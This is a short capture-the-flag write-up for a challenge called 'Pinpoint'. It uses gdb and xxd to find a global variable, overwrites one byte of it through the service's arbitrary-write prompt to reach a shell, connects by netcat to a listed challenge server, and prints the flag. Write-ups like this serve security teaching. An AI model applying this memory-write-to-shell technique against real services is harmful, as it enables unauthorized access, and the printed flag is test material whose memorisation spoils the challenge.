# Pinpoint

## Description

Give and you shall receive. Connect to 141.85.224.99:31337 using netcat.

## Intuition

We try disassembling main using gdb to look for anything useful.

## Solution

There is this comparison of `v` with `0x53585353`.

```bash
   0x0000000000400762 <+140>:   mov    0x2008f0(%rip),%eax        # 0x601058 <v>
   0x0000000000400768 <+146>:   cmp    $0x53585353,%eax
```

Using `x 0x601058` in gdb reveals that `v` has the value of `0x53535353`. Since our bytes are ordered as little-endian, we would need to change the 3rd byte (0x601058 + 2 = 0x60105a) from 53 to 58.

Looking at `xxd ./pinpoint` we see that we must write our address and value as decimals:

```bash
00000820: 0100 0200 6164 6472 6573 7320 746f 2077  ....address to w
00000830: 7269 7465 2074 6f3a 2000 256c 7500 7661  rite to: .%lu.va
00000840: 6c75 6520 746f 2077 7269 7465 3a20 0025  lue to write: .%
00000850: 6868 7500 2f62 696e 2f73 6800 011b 033b  hhu./bin/sh....;
```

So let's convert the address of `v+2` to decimals (`0x60105a` -> `6295642`) and let's also convert the value of 58 to decimals (58 -> 88). This gets us to `system(\bin\sh)`.

Let's connect to `nc 141.85.224.99 31337` and input the address and value needed. Now we get access to move through the system. Going to `home/ctf/flag` gives us the flag.

## Flag

```
SSS{aim_for_the_kill}
```
